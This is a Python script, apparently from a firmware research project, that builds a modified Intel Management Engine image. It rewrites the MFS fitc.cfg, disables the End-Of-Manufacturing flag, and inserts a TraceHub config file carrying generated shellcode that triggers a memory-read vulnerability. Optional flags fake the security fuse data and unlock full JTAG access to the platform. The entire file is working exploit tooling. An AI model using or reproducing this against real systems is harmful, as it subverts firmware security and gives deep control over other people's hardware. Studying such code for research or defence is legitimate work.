#!/usr/bin/python3
# SPDX-License-Identifier: GPL-2.0-only

import argparse
import os
from lib.exploit import GenerateShellCode
from lib.image import parse_ifd_or_me
from lib.mfs import INTEL_IDX, FITC_IDX, HOME_IDX, MFS
from lib.cfg import CFG

def generate_fitc_from_intel_and_delta(intel_cfg, delta_dir):
    # Create empty fitc.cfg
    fitc_cfg = CFG()

    for intel_file in intel_cfg.files:
        # Copy over directory
        if intel_file.isDirectory():
            fitc_cfg.addFile(intel_file.path, intel_file.data,
                             intel_file.record.mode, intel_file.record.opt,
                             intel_file.record.uid, intel_file.record.gid)
            continue

        # Skip non-overridable file
        if (intel_file.record.opt & 1) == 0:
            continue

        # Look for file in the delta
        delta_path = os.path.join(delta_dir, intel_file.path.lstrip("/"))
        if os.path.isfile(delta_path):
            # Create modified overridable file from delta
            with open(delta_path, "rb") as f:
                fitc_cfg.addFile(intel_file.path, f.read(),
                                 intel_file.record.mode, intel_file.record.opt,
                                 intel_file.record.uid, intel_file.record.gid)
        else:
            # Copy over unmodified overridable file
            fitc_cfg.addFile(intel_file.path, intel_file.data,
                             intel_file.record.mode, intel_file.record.opt,
                             intel_file.record.uid, intel_file.record.gid)

    return fitc_cfg

def apply_exploit_to_fitc(fitc_cfg, version, pch, sku, fake_fpfs, red_unlock):
    # Make sure End-Of-Manufacturing is off
    fitc_cfg.removeFile("/home/mca/eom")
    fitc_cfg.addFile("/home/mca/eom", b"\x00", CFG.strToMode(' --Irw-r-----'), CFG.strToOpt('?!-F'), 0, 238)

    # Generate TraceHub configuration file with exploit payload
    ct_payload = GenerateShellCode(version, pch, sku, fake_fpfs, red_unlock)
    # Add TraceHub configuration file
    fitc_cfg.removeFile("/home/bup/ct")
    fitc_cfg.addFile("/home/bup/ct", ct_payload, CFG.strToMode(' ---rwxr-----'), CFG.strToOpt('?--F'), 3, 351)

def add_fitc_to_sysvol(sysvol, fitc_data):
    # Delete original fitc.cfg
    sysvol.removeFile(FITC_IDX)
    # Delete home partition (we want all data to come from the new fitc.cfg)
    sysvol.removeFile(HOME_IDX)
    # Insert new fitc.cfg
    # NOTE: optimize=False is required to break up continous chunks,
    # which causes the vulnerable code to perform multiple reads.
    sysvol.addFile(FITC_IDX, fitc_data, optimize=False)

parser = argparse.ArgumentParser()
parser.add_argument("--input", required=True, help="Donor image (either full with IFD or just ME)")
parser.add_argument("--output", required=True, help="Output ME image")
parser.add_argument("--delta", required=True, help="MFS delta directory")
parser.add_argument('--version', required=True, help='Donor ME version')
parser.add_argument('--pch', required=True, help='PCH type')
parser.add_argument('--sku', metavar='<ME SKU>', help='ME SKU', required=True)
parser.add_argument('--fake-fpfs', help='replace SRAM copy of FPFs with the provided data')
parser.add_argument('--red-unlock', help='allow full JTAG access to the entire platform', action='store_true')
args = parser.parse_args()

# Get ME from input image
with open(args.input, "rb") as f:
    me = parse_ifd_or_me(f.read())

# Make sure delta directory exists
if not os.path.isdir(args.delta):
    raise ValueError(f"Delta directory {args.delta} not found")

# Read FPF data
fake_fpfs = None
if args.fake_fpfs:
    with open(args.fake_fpfs, "rb") as f:
        fake_fpfs = f.read()

# Parse MFS and get its system volume
mfs = MFS(me.entry_data("MFS"))
sysvol = mfs.getSystemVolume()

# Read intel.cfg
intel_cfg = CFG(sysvol.getFile(INTEL_IDX).data)

# Generate fitc.cfg
fitc_cfg = generate_fitc_from_intel_and_delta(intel_cfg, args.delta)
# Modify fitc.cfg with exploit
apply_exploit_to_fitc(fitc_cfg, args.version, args.pch, args.sku, fake_fpfs, args.red_unlock)
# Re-generate fitc.cfg
fitc_cfg.generate(alignment=2)

# Write fitc.cfg
add_fitc_to_sysvol(sysvol, fitc_cfg.data)
# Re-generate MFS
mfs.generate()
# Write MFS to ME image
me.write_entry_data("MFS", mfs.data)
# Write out ME image
with open(args.output, "wb") as f:
    f.write(me.data)
